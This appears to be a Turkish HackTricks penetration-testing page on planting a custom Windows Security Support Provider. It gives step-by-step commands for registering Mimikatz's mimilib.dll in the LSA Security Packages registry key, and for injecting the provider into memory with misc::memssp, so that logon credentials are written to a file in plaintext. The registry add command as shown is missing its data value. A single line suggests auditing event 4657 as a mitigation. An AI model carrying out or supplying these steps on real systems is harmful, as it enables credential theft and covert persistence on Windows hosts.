# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[SSP (Güvenlik Destek Sağlayıcısı) nedir burada öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Kendi **SSP'nizi** oluşturabilirsiniz, böylece makineye erişim için kullanılan **kimlik bilgilerini** **düz metin** olarak **yakalayabilirsiniz**.

#### Mimilib

Mimikatz tarafından sağlanan `mimilib.dll` ikili dosyasını kullanabilirsiniz. **Bu, tüm kimlik bilgilerini düz metin olarak bir dosyaya kaydedecektir.**\
Dll'yi `C:\Windows\System32\` dizinine bırakın.\
Mevcut LSA Güvenlik Paketlerinin bir listesini alın:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
`mimilib.dll`'yi Güvenlik Destek Sağlayıcı listesine (Güvenlik Paketleri) ekleyin:
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Ve bir yeniden başlatmadan sonra tüm kimlik bilgileri `C:\Windows\System32\kiwissp.log` dosyasında düz metin olarak bulunabilir.

#### Bellekte

Bunu doğrudan belleğe Mimikatz kullanarak da enjekte edebilirsiniz (biraz kararsız/çalışmayabileceğini unutmayın):
```bash
privilege::debug
misc::memssp
```
Bu yeniden başlatmalara dayanmaz.

#### Hafifletme

Olay ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` oluşturma/değiştirme denetimi

{{#include ../../banners/hacktricks-training.md}}
